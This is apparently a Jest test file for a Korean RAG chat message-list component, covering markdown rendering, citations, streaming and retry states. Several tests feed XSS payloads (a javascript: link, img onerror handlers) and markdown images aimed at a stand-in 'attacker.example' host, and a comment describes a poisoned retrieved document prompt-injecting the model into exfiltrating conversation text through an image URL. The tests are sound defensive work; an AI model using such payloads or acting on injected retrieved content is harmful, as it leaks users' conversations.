import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { MessageList, type ChatMessage } from "./MessageList";

/**
 * No modules are mocked here -- `react-markdown` and its remark/rehype pipeline run for
 * real against jsdom, so these tests exercise the actual rendering output, not a stand-in
 * for it. That is deliberate: the XSS-relevant assertions (raw HTML never becomes live
 * DOM, `javascript:` links are stripped) only mean something if the real parser produced
 * them. `assistantMessage()` supplies the `streamStatus` field every case needs so
 * individual tests only override what they are actually testing.
 */
function assistantMessage(content: string, overrides: Partial<ChatMessage> = {}): ChatMessage {
  return { id: "a1", role: "assistant", content, streamStatus: "done", ...overrides };
}

describe("MessageList", () => {
  // Name frozen by `design-tokens.test.ts`'s `D1_BASELINE_NAMES` (Spec §Tech Review AD-2) --
  // T7 replaces the old single-sentence placeholder this test used to check, but the name
  // itself must not change.
  it("shows a placeholder when there are no messages yet", () => {
    render(<MessageList messages={[]} />);
    expect(screen.queryByText("대화를 시작해보세요.")).not.toBeInTheDocument();
  });

  describe("empty state (card T7)", () => {
    it("[chat-prototype-port:AC-12] renders the empty-state title and description, and renders 0 of the old placeholder sentence", () => {
      render(<MessageList messages={[]} />);

      expect(screen.getByText("무엇을 찾아드릴까요?")).toBeInTheDocument();
      expect(
        screen.getByText(
          "사내 문서에 근거해서 답변합니다. 답변 아래에는 참고한 문서와 페이지가 함께 표시됩니다.",
        ),
      ).toBeInTheDocument();
      // INC-013 (absence proof): the replaced sentence must be gone, not merely coexisting.
      expect(screen.queryByText("대화를 시작해보세요.")).not.toBeInTheDocument();
    });

    it("[chat-prototype-port:AC-13] renders the three example-question chips with exact literal labels", () => {
      render(<MessageList messages={[]} />);

      // Spec §6 discriminating-power requirement 4 -- literals re-typed here, not read off a
      // component-exported constant, so a wrong constant value would still fail this test.
      expect(screen.getByRole("button", { name: "연차 이월 규정이 어떻게 되나요?" })).toBeInTheDocument();
      expect(screen.getByRole("button", { name: "법인카드 사용 한도는?" })).toBeInTheDocument();
      expect(screen.getByRole("button", { name: "보안 교육 이수 기한 알려줘" })).toBeInTheDocument();
    });

    it("calls onExampleSelect with a clicked chip's exact, untransformed label", async () => {
      const user = userEvent.setup();
      const onExampleSelect = jest.fn();
      render(<MessageList messages={[]} onExampleSelect={onExampleSelect} />);

      await user.click(screen.getByRole("button", { name: "법인카드 사용 한도는?" }));

      expect(onExampleSelect).toHaveBeenCalledTimes(1);
      expect(onExampleSelect).toHaveBeenCalledWith("법인카드 사용 한도는?");
    });

    it("does not throw when a chip is clicked and onExampleSelect is omitted", async () => {
      const user = userEvent.setup();
      render(<MessageList messages={[]} />);

      await user.click(screen.getByRole("button", { name: "보안 교육 이수 기한 알려줘" }));
      // No assertion beyond "did not throw" -- `onExampleSelect` is optional (`?.()` call).
    });
  });

  it("renders a user message as plain text, not interpreted as markdown", () => {
    render(<MessageList messages={[{ id: "u1", role: "user", content: "**bold** should stay literal" }]} />);

    expect(screen.getByText("**bold** should stay literal")).toBeInTheDocument();
    expect(screen.queryByRole("strong")).not.toBeInTheDocument();
  });

  it("[chat:AC-37] renders a markdown heading as a real heading element, not literal '#' text", () => {
    render(<MessageList messages={[assistantMessage("## A heading")]} />);

    const heading = screen.getByRole("heading", { level: 2, name: "A heading" });
    expect(heading.tagName).toBe("H2");
    expect(screen.queryByText("## A heading")).not.toBeInTheDocument();
  });

  it("[chat:AC-37] renders a markdown bullet list as <ul><li>, not literal '-' text", () => {
    render(<MessageList messages={[assistantMessage("- first\n- second")]} />);

    // Scoped to the assistant message's own container: the transcript itself is also a
    // `<ul>` (role "list"), so an unscoped query would match both.
    const markdown = within(screen.getByTestId("message-a1"));
    const list = markdown.getByRole("list");
    expect(list.tagName).toBe("UL");
    const items = markdown.getAllByRole("listitem");
    expect(items.map((li) => li.textContent)).toEqual(["first", "second"]);
  });

  it("[chat:AC-37] renders a markdown ordered list as <ol><li>", () => {
    render(<MessageList messages={[assistantMessage("1. first\n2. second")]} />);

    const list = within(screen.getByTestId("message-a1")).getByRole("list");
    expect(list.tagName).toBe("OL");
  });

  it("[chat:AC-37] renders a fenced code block as <pre><code>, not literal backtick text", () => {
    const content = ["```js", "console.log('hi')", "```"].join("\n");
    render(<MessageList messages={[assistantMessage(content)]} />);

    const code = screen.getByText("console.log('hi')");
    expect(code.tagName).toBe("CODE");
    expect(code.closest("pre")).not.toBeNull();
    expect(screen.queryByText(/```/)).not.toBeInTheDocument();
  });

  // review 2026-08-29 round-2 L3: untagged (not `[chat:AC-37]`) -- AC-37's own wording covers
  // only headings/lists/fenced code blocks rendering as their DOM equivalents, not link
  // safety attributes. Kept consistent with the (correctly untagged) markdown-image guard
  // tests below.
  // [Correction, review 2026-08-29 round-3 Medium-4] The previous version of this comment
  // claimed "AC-37's Spec evidence cell already cites this file's link/XSS tests by name in
  // prose" as the reason removing the tag was safe. That claim is false -- grepped the Spec
  // directly (`MessageList.test`, "renders an https link", "javascript: URL", "raw HTML in
  // the response": 0 matches). AC-37's evidence cell does not cite these tests by file name
  // or test name at all; it only mentions the topic in one sentence with zero citations.
  // The conclusion (removing the tag doesn't orphan anything) is still correct, but for the
  // opposite reason: there was never a name citation to orphan in the first place.
  it("renders an https link with target=_blank and rel=noopener noreferrer", () => {
    render(<MessageList messages={[assistantMessage("[docs](https://example.com/docs)")]} />);

    const link = screen.getByRole("link", { name: "docs" });
    expect(link).toHaveAttribute("href", "https://example.com/docs");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
  });

  // review 2026-08-29 round-2 L3: untagged for the same reason as the link test above.
  it("never renders a javascript: URL as a clickable link (XSS guard)", () => {
    render(<MessageList messages={[assistantMessage("[click me](javascript:alert(1))")]} />);

    expect(screen.queryByRole("link", { name: "click me" })).not.toBeInTheDocument();
    expect(screen.getByText("click me")).toBeInTheDocument();
  });

  // review 2026-08-29 round-2 L3: untagged for the same reason as the two tests above.
  it("never renders raw HTML in the response as live DOM (no dangerouslySetInnerHTML passthrough)", () => {
    render(<MessageList messages={[assistantMessage('<img src=x onerror="window.__pwned = true">')]} />);

    // react-markdown escapes raw HTML by default (rehype-raw is never added) -- it must
    // show up as inert text, and the onerror handler must never execute.
    expect(document.querySelector("img")).toBeNull();
    expect((window as unknown as { __pwned?: boolean }).__pwned).toBeUndefined();
  });

  // review 2026-08-29 High-2: markdown image syntax (`![alt](src)`) is a distinct AST node
  // from raw HTML, so the raw-HTML guard above does not cover it -- react-markdown's own
  // `defaultUrlTransform` allow-lists http/https for `img src`, which would otherwise let a
  // poisoned RAG document prompt-inject the model into emitting a live `<img>` that
  // exfiltrates conversation text via a query string the instant it renders (no click
  // needed). These cases exercise `markdownComponents.img`'s allow-list directly.
  it("never renders an http(s) markdown image as a live <img>, falling back to its alt text", () => {
    render(<MessageList messages={[assistantMessage("![x](https://attacker.example/p.png?q=leak)")]} />);

    expect(document.querySelector("img")).toBeNull();
    expect(screen.getByText("x")).toBeInTheDocument();
  });

  it("renders a same-origin relative markdown image as a live <img>", () => {
    render(<MessageList messages={[assistantMessage("![logo](/logo.png)")]} />);

    const img = document.querySelector("img");
    expect(img).not.toBeNull();
    expect(img).toHaveAttribute("src", "/logo.png");
  });

  // NOTE (found while writing this test, reported not fixed -- outside dev-qa-tester's
  // scope): `isSafeImageSrc`'s own [Rationale] states this allow-list covers "data: URIs
  // only" alongside relative paths, but a markdown `![alt](data:...)` never actually
  // reaches that function with its `data:` scheme intact -- react-markdown's own
  // `defaultUrlTransform` (`safeProtocol` regex in `node_modules/react-markdown/lib/
  // index.js`, which does not include `data:`) rewrites it to `""` first, so
  // `markdownComponents.img` always sees an empty `src` and falls back to alt text. The
  // `data:` branch of `isSafeImageSrc` is therefore unreachable via markdown image syntax
  // in the shipped react-markdown version -- asserting the alt-text fallback here (not a
  // live `<img>`) reflects actual, verified behavior.
  it("falls back to alt text for a data: URI markdown image (react-markdown's own urlTransform strips it before this component sees it)", () => {
    const dataUri = "data:image/png;base64,iVBORw0KGgo=";
    render(<MessageList messages={[assistantMessage(`![inline](${dataUri})`)]} />);

    expect(document.querySelector("img")).toBeNull();
    expect(screen.getByText("inline")).toBeInTheDocument();
  });

  it("never renders a protocol-relative markdown image as a live <img> (host is not actually same-origin)", () => {
    render(<MessageList messages={[assistantMessage("![x](//attacker.example/p.png)")]} />);

    expect(document.querySelector("img")).toBeNull();
    expect(screen.getByText("x")).toBeInTheDocument();
  });

  it("marks a streaming assistant message as busy for assistive tech, and a finished one as not busy", () => {
    const { rerender } = render(<MessageList messages={[assistantMessage("partial", { streamStatus: "streaming" })]} />);
    expect(screen.getByTestId("message-a1")).toHaveAttribute("aria-busy", "true");

    rerender(<MessageList messages={[assistantMessage("full", { streamStatus: "done" })]} />);
    expect(screen.getByTestId("message-a1")).toHaveAttribute("aria-busy", "false");
  });

  describe("citation area (hybrid-rag Spec T15)", () => {
    it("[hybrid-rag:AC-18] renders a \"출처\" header with the count and one item per source", () => {
      render(
        <MessageList
          messages={[
            assistantMessage("answer", {
              sources: [
                { documentId: "d1", filename: "인사규정_2026.pdf", score: 0.02, snippet: "s1", page: 12 },
                { documentId: "d2", filename: "취업규칙.pdf", score: 0.01, snippet: "s2", page: null },
              ],
            }),
          ]}
        />,
      );

      expect(screen.getByText("출처")).toBeInTheDocument();
      expect(screen.getByText("2건")).toBeInTheDocument();
      // Scoped to this message's own row: the transcript itself is also a <ul>/<li> structure
      // (MessageList.module.css .list/.assistantRow), so an unscoped query would also match the
      // outer row's own <li>.
      const row = within(screen.getByTestId("message-a1").closest("li")!);
      expect(row.getAllByRole("listitem")).toHaveLength(2);
      // AC-18's third clause ("각 항목에 해당 항목의 filename 문자열이 표시된다") asserted directly
      // here too (review 2026-08-31 Medium-1) -- not left solely to the AC-19 test below, so the
      // evidence-ledger citation for AC-18 doesn't depend on a differently-tagged test.
      expect(row.getByText(/인사규정_2026\.pdf/)).toBeInTheDocument();
      expect(row.getByText(/취업규칙\.pdf/)).toBeInTheDocument();
    });

    it("[hybrid-rag:AC-19] shows \"filename p.page\" when page is present and just \"filename\" when page is null", () => {
      render(
        <MessageList
          messages={[
            assistantMessage("answer", {
              sources: [
                { documentId: "d1", filename: "인사규정_2026.pdf", score: 0.02, snippet: "s1", page: 12 },
                { documentId: "d2", filename: "복리후생_안내.docx", score: 0.01, snippet: "s2", page: null },
              ],
            }),
          ]}
        />,
      );

      expect(screen.getByText("인사규정_2026.pdf p.12")).toBeInTheDocument();
      expect(screen.getByText("복리후생_안내.docx")).toBeInTheDocument();
    });

    it("[hybrid-rag:AC-20] renders the \"출처\" header with 0건 and the fixed no-evidence text for an empty sources array", () => {
      render(<MessageList messages={[assistantMessage("answer", { sources: [] })]} />);

      expect(screen.getByText("출처")).toBeInTheDocument();
      expect(screen.getByText("0건")).toBeInTheDocument();
      expect(screen.getByText("이 답변에는 근거 문서가 없습니다.")).toBeInTheDocument();
      // No source-item <li> under the sources area specifically (the transcript row's own
      // outer <li> still exists and is out of scope for this assertion).
      const row = within(screen.getByTestId("message-a1").closest("li")!);
      expect(row.queryByRole("list")).not.toBeInTheDocument();
    });

    it("[hybrid-rag:AC-21] clause ① renders no citation area while the stream is still in progress", () => {
      render(<MessageList messages={[assistantMessage("partial", { streamStatus: "streaming", sources: null })]} />);

      expect(screen.queryByText("출처")).not.toBeInTheDocument();
      expect(screen.queryByText("출처를 불러오지 못했습니다.")).not.toBeInTheDocument();
    });

    it("[hybrid-rag:AC-21] clause ② resolves to the AC-18/AC-20 screens once the stream ends with a non-null sources value", () => {
      const { rerender } = render(
        <MessageList messages={[assistantMessage("partial", { streamStatus: "streaming", sources: null })]} />,
      );
      expect(screen.queryByText("출처")).not.toBeInTheDocument();

      rerender(
        <MessageList
          messages={[
            assistantMessage("full", {
              streamStatus: "done",
              sources: [{ documentId: "d1", filename: "a.pdf", score: 0.01, snippet: "s", page: null }],
            }),
          ]}
        />,
      );
      expect(screen.getByText("출처")).toBeInTheDocument();
      expect(screen.getByText("1건")).toBeInTheDocument();
    });

    it("[hybrid-rag:AC-21] clause ③ shows a delivery-failure message, visually distinct from AC-20, when the stream ends without ever receiving sources", () => {
      render(<MessageList messages={[assistantMessage("answer", { streamStatus: "done", sources: null })]} />);

      expect(screen.getByText("출처를 불러오지 못했습니다.")).toBeInTheDocument();
      expect(screen.queryByText("이 답변에는 근거 문서가 없습니다.")).not.toBeInTheDocument();
      expect(screen.queryByText("출처")).not.toBeInTheDocument(); // clause ③ has no "출처"+count header at all
    });

    it("[hybrid-rag:AC-22] keeps an earlier message's sources unchanged while a later message in the same list is still streaming", () => {
      render(
        <MessageList
          messages={[
            assistantMessage("first turn answer", {
              id: "a1",
              streamStatus: "done",
              sources: [{ documentId: "d1", filename: "a.pdf", score: 0.01, snippet: "s", page: null }],
            }),
            assistantMessage("second turn partial", { id: "a2", streamStatus: "streaming", sources: null }),
          ]}
        />,
      );

      const firstRow = within(screen.getByTestId("message-a1").closest("li")!);
      expect(firstRow.getByText("출처")).toBeInTheDocument();
      expect(firstRow.getByText("1건")).toBeInTheDocument();

      const secondRow = within(screen.getByTestId("message-a2").closest("li")!);
      expect(secondRow.queryByText("출처")).not.toBeInTheDocument();
    });

    // review 2026-08-31 High-1: a message this component never tracked a stream for (`sources`
    // left `undefined`, e.g. loaded from conversation history) must not fall into clause ③ --
    // that would falsely tell the user every historical reply's citations failed to load.
    it("[hybrid-rag:AC-21] renders no citation area (not the clause ③ failure message) for a message with no sources field at all", () => {
      render(<MessageList messages={[{ id: "h1", role: "assistant", content: "old answer", streamStatus: "done" }]} />);

      expect(screen.queryByText("출처를 불러오지 못했습니다.")).not.toBeInTheDocument();
      expect(screen.queryByText("출처")).not.toBeInTheDocument();
    });

    // review 2026-08-31 Medium-2: the backend maps one Source per retrieved *chunk*, not per
    // document, so two sources sharing a documentId (different pages of the same file) is a
    // normal result, not a malformed one -- this must not collide as a React key or drop items.
    // review 2026-08-31 round-2 correctness Medium-1: a single static render can't actually
    // discriminate a React key collision (React still renders both children on first mount,
    // only warning via console.error -- the failure mode is dropped/stale items on a later
    // *update*, i.e. reconciliation, which a one-shot render never exercises). This test now
    // asserts the "same key" warning is absent, and separately drives a rerender that removes
    // the first item to prove the remaining item survives reconciliation correctly.
    it("[hybrid-rag:AC-18] renders both items distinctly when two sources share the same documentId (different pages), without a React duplicate-key warning", () => {
      const consoleErrorSpy = jest.spyOn(console, "error").mockImplementation(() => {});
      try {
        const sourcesWithDuplicateDocumentId = [
          { documentId: "d1", filename: "인사규정_2026.pdf", score: 0.02, snippet: "s1", page: 3 },
          { documentId: "d1", filename: "인사규정_2026.pdf", score: 0.01, snippet: "s2", page: 7 },
        ];
        const { rerender } = render(
          <MessageList messages={[assistantMessage("answer", { sources: sourcesWithDuplicateDocumentId })]} />,
        );

        expect(screen.getByText("2건")).toBeInTheDocument();
        let row = within(screen.getByTestId("message-a1").closest("li")!);
        expect(row.getAllByRole("listitem")).toHaveLength(2);
        expect(row.getByText("인사규정_2026.pdf p.3")).toBeInTheDocument();
        expect(row.getByText("인사규정_2026.pdf p.7")).toBeInTheDocument();
        expect(
          consoleErrorSpy.mock.calls.some((call) => /same key|Encountered two children/i.test(String(call[0]))),
        ).toBe(false);

        // Drives an actual reconciliation update (not just a fresh mount) -- removes the first
        // item so a colliding key would show stale/duplicated content for the remaining one.
        rerender(
          <MessageList messages={[assistantMessage("answer", { sources: [sourcesWithDuplicateDocumentId[1]] })]} />,
        );
        row = within(screen.getByTestId("message-a1").closest("li")!);
        expect(row.getAllByRole("listitem")).toHaveLength(1);
        expect(row.getByText("인사규정_2026.pdf p.7")).toBeInTheDocument();
        expect(row.queryByText("인사규정_2026.pdf p.3")).not.toBeInTheDocument();
      } finally {
        consoleErrorSpy.mockRestore();
      }
    });

    // Security (hybrid-rag Spec §7 OQ-3 decision D-A, review 2026-08-31 Low-2): score/snippet/
    // documentId must never reach the screen as visible text -- only filename/page are approved
    // for display.
    it("never renders a source's score, snippet, or documentId as visible text", () => {
      render(
        <MessageList
          messages={[
            assistantMessage("answer", {
              sources: [
                {
                  documentId: "11111111-2222-3333-4444-555555555555",
                  filename: "a.pdf",
                  score: 0.0163,
                  snippet: "기밀-본문-발췌-내용",
                  page: null,
                },
              ],
            }),
          ]}
        />,
      );

      const rowElement = screen.getByTestId("message-a1").closest("li")!;
      const row = within(rowElement);
      expect(row.queryByText(/기밀-본문-발췌-내용/)).not.toBeInTheDocument();
      expect(row.queryByText(/0\.0163/)).not.toBeInTheDocument();
      expect(row.queryByText(/11111111-2222-3333-4444-555555555555/)).not.toBeInTheDocument();
      // review 2026-08-31 round-2 security Low-2: `queryByText` only inspects text nodes and
      // would miss a leak via an attribute (e.g. `title={source.snippet}`, `aria-label`,
      // `data-*`) -- checking the row's full serialized markup closes that gap.
      expect(rowElement.outerHTML).not.toContain("기밀-본문-발췌-내용");
      expect(rowElement.outerHTML).not.toContain("0.0163");
      expect(rowElement.outerHTML).not.toContain("11111111-2222-3333-4444-555555555555");
    });

    // Security (hybrid-rag Spec T15 review Low-1): filename/snippet reach the wire unescaped
    // -- this must render as an inert text node, never live markup.
    it("never renders a source filename containing HTML as live DOM (XSS guard)", () => {
      render(
        <MessageList
          messages={[
            assistantMessage("answer", {
              sources: [
                {
                  documentId: "d1",
                  filename: '<img src=x onerror="window.__sourcePwned = true">',
                  score: 0.01,
                  snippet: "s",
                  page: null,
                },
              ],
            }),
          ]}
        />,
      );

      expect(document.querySelector("img")).toBeNull();
      expect((window as unknown as { __sourcePwned?: boolean }).__sourcePwned).toBeUndefined();
      expect(
        screen.getByText('<img src=x onerror="window.__sourcePwned = true">'),
      ).toBeInTheDocument();
    });
  });

  describe("bubble/avatar structure, streaming badge/caret, RAG-OFF badge/notice (card T6)", () => {
    it("[chat-prototype-port:AC-26] carries the 나/어시스턴트 role labels in the DOM for both roles (regression -- visual hiding is allowed, absence is not)", () => {
      render(
        <MessageList
          messages={[
            { id: "u1", role: "user", content: "질문입니다" },
            assistantMessage("답변입니다"),
          ]}
        />,
      );

      expect(screen.getByText("나")).toBeInTheDocument();
      expect(screen.getByText("어시스턴트")).toBeInTheDocument();
    });

    it("[chat-prototype-port:AC-15] renders the streaming badge while streaming, and 0 while done (반대 조건)", () => {
      const { rerender } = render(
        <MessageList messages={[assistantMessage("partial", { streamStatus: "streaming" })]} />,
      );
      expect(screen.getByText("생성 중 · 토큰 스트리밍")).toBeInTheDocument();

      rerender(<MessageList messages={[assistantMessage("full", { streamStatus: "done" })]} />);
      expect(screen.queryByText("생성 중 · 토큰 스트리밍")).not.toBeInTheDocument();
    });

    it("[chat-prototype-port:AC-16] renders exactly one stream-caret testid while streaming, and 0 once the stream ends (반대 조건)", () => {
      const { rerender } = render(
        <MessageList messages={[assistantMessage("partial", { streamStatus: "streaming" })]} />,
      );
      expect(screen.getAllByTestId("stream-caret")).toHaveLength(1);

      rerender(<MessageList messages={[assistantMessage("full", { streamStatus: "done" })]} />);
      expect(screen.queryAllByTestId("stream-caret")).toHaveLength(0);
    });

    it("[chat-prototype-port:AC-24] renders the RAG-OFF badge when ragEnabled is false, and 0 when ragEnabled is true (반대 조건)", () => {
      const { rerender } = render(
        <MessageList messages={[assistantMessage("answer")]} ragEnabled={false} />,
      );
      expect(screen.getByText("RAG 근거 미사용 · 모델 일반 지식")).toBeInTheDocument();

      rerender(<MessageList messages={[assistantMessage("answer")]} ragEnabled={true} />);
      expect(screen.queryByText("RAG 근거 미사용 · 모델 일반 지식")).not.toBeInTheDocument();
    });

    // Not an AC-24 clause -- AC-24's own "켜진 대화에서는 0개" requirement is already covered by
    // the `ragEnabled={true}` branch of the sibling test just above. This test's own subject is
    // orthogonal to that: what happens when `ragEnabled` is omitted (`undefined`) entirely, a
    // third state introduced by T14's second rework round removing the prior `= true` default
    // (review `2026-09-01_chat-prototype-port-T14-round2.md` Medium-2 -- this test used to be
    // named/tagged as if it proved "defaults to ON", which stopped being true the moment that
    // default was deleted; it only ever proved the OFF badge's absence, for the wrong reason).
    it("does not render the RAG-OFF badge when ragEnabled is omitted (undefined claims neither ON nor OFF, unlike the old removed `= true` default)", () => {
      render(<MessageList messages={[assistantMessage("answer")]} />);
      expect(screen.queryByText("RAG 근거 미사용 · 모델 일반 지식")).not.toBeInTheDocument();
    });

    // [chat-prototype-port:AC-44] dev-qa-tester addition (T16 2회차 QA, 2026-09-02) -- the sibling
    // test just above already proves `TopBadge` stays silent on `ragEnabled === undefined`, but
    // nothing in this suite proved the *notice box* (`MessageList.tsx:308`'s `ragEnabled === false`
    // branch) does the same. That gap mattered specifically for T16: review Block High-1
    // (`docs/review/2026-09-01_chat-prototype-port-T16.md`) named this exact element
    // (`MessageList.tsx:304-331`, "RAG-OFF 안내 박스") as one of three fallout surfaces that kept
    // asserting a stale ON/OFF fact while `ChatWorkspace`'s header honestly said "확인 불가" --
    // the fix (`ChatWorkspace.tsx:838`, gating the `ragEnabled` prop to `undefined` while
    // `isRagUnverified`) only actually closes that hole if this element treats `undefined` the same
    // inert way `TopBadge` does. `ChatWorkspace.test.tsx`'s own AC-44 test cannot observe this by
    // itself -- its fixture conversation has zero messages (`mockedGetMessages.mockResolvedValue([])`),
    // so neither `TopBadge` nor this notice box ever mounts in that test at all; the "확인 불가"
    // scenario there only ever exercises the header toggle and `ChatPanel`'s composer hint.
    it("does not render the RAG-OFF notice box when ragEnabled is omitted (undefined claims neither ON nor OFF, same as the badge above)", () => {
      render(<MessageList messages={[assistantMessage("answer")]} />);
      expect(screen.queryByText(/^문서 근거 없이 답변했습니다\./)).not.toBeInTheDocument();
    });

    it("[chat-prototype-port:AC-25] renders the RAG-OFF notice box when ragEnabled is false, and 0 when ragEnabled is true (반대 조건)", () => {
      const { rerender } = render(
        <MessageList messages={[assistantMessage("answer")]} ragEnabled={false} />,
      );
      expect(screen.getByText(/^문서 근거 없이 답변했습니다\./)).toBeInTheDocument();

      rerender(<MessageList messages={[assistantMessage("answer")]} ragEnabled={true} />);
      expect(screen.queryByText(/^문서 근거 없이 답변했습니다\./)).not.toBeInTheDocument();
    });

    it("[chat-prototype-port:AC-25] renders the RAG-OFF notice while still streaming, not only once the stream ends (matches the prototype's showAnswerOff gating -- ragOn alone, no isDone split)", () => {
      render(
        <MessageList
          messages={[assistantMessage("partial", { streamStatus: "streaming", sources: null })]}
          ragEnabled={false}
        />,
      );
      expect(screen.getByText(/^문서 근거 없이 답변했습니다\./)).toBeInTheDocument();
    });

    it("[chat-prototype-port:AC-19] renders a role=alert error card with the fixed title and a 다시 시도 button for a streamStatus: error message, and 0 while done (반대 조건)", () => {
      const { rerender } = render(
        <MessageList messages={[assistantMessage("partial", { streamStatus: "error" })]} />,
      );
      const errorCard = screen.getByRole("alert");
      expect(within(errorCard).getByText("응답을 받지 못했습니다")).toBeInTheDocument();
      expect(within(errorCard).getByRole("button", { name: "다시 시도" })).toBeInTheDocument();
      // Already-arrived content stays on screen, unmodified (Spec §8 R-5).
      expect(screen.getByText("partial")).toBeInTheDocument();
      // INC-013 absence proof -- the retired inline error sentence must be gone, not merely
      // coexisting with the new card.
      expect(screen.queryByText("메시지를 가져오지 못했습니다.")).not.toBeInTheDocument();

      rerender(<MessageList messages={[assistantMessage("full", { streamStatus: "done" })]} />);
      expect(screen.queryByRole("alert")).not.toBeInTheDocument();
    });

    it("[chat-prototype-port:AC-20] clicking 다시 시도 calls onRetry with the exact content of the immediately preceding user message", async () => {
      const user = userEvent.setup();
      const onRetry = jest.fn();
      render(
        <MessageList
          messages={[
            { id: "u1", role: "user", content: "연차 이월 규정이 어떻게 되나요?" },
            assistantMessage("", { id: "a1", streamStatus: "error" }),
          ]}
          onRetry={onRetry}
        />,
      );

      await user.click(screen.getByRole("button", { name: "다시 시도" }));

      expect(onRetry).toHaveBeenCalledTimes(1);
      // Character-for-character equality against the raw preceding user message, not a
      // substring/regex match (Spec §6 판별력 요건: "정규화 후 비교 금지", same convention the
      // example-chip AC-14 test above already applies).
      expect(onRetry).toHaveBeenCalledWith("연차 이월 규정이 어떻게 되나요?");
    });

    it("[chat-prototype-port:AC-20] disables the 다시 시도 button while isSending is true, and re-enables it once false (반대 조건)", () => {
      const { rerender } = render(
        <MessageList
          messages={[
            { id: "u1", role: "user", content: "hi" },
            assistantMessage("", { id: "a1", streamStatus: "error" }),
          ]}
          isSending={true}
        />,
      );
      expect(screen.getByRole("button", { name: "다시 시도" })).toBeDisabled();

      rerender(
        <MessageList
          messages={[
            { id: "u1", role: "user", content: "hi" },
            assistantMessage("", { id: "a1", streamStatus: "error" }),
          ]}
          isSending={false}
        />,
      );
      expect(screen.getByRole("button", { name: "다시 시도" })).toBeEnabled();
    });

    it("does not throw when 다시 시도 is clicked and onRetry is omitted", async () => {
      const user = userEvent.setup();
      render(<MessageList messages={[assistantMessage("partial", { streamStatus: "error" })]} />);

      await user.click(screen.getByRole("button", { name: "다시 시도" }));
      // No assertion beyond "did not throw" -- `onRetry` is optional (`?.()` call), same
      // convention `onExampleSelect`'s own omitted-callback test above already covers.
    });

    it("renders a user message inside a bubble container and an assistant message next to a decorative avatar (structure, no AC number)", () => {
      render(
        <MessageList
          messages={[
            { id: "u1", role: "user", content: "질문" },
            assistantMessage("답변"),
          ]}
        />,
      );

      expect(screen.getByTestId("message-u1").className).toMatch(/userBubble/);
      const avatar = screen.getByText("in");
      expect(avatar).toHaveAttribute("aria-hidden", "true");
    });
  });
});
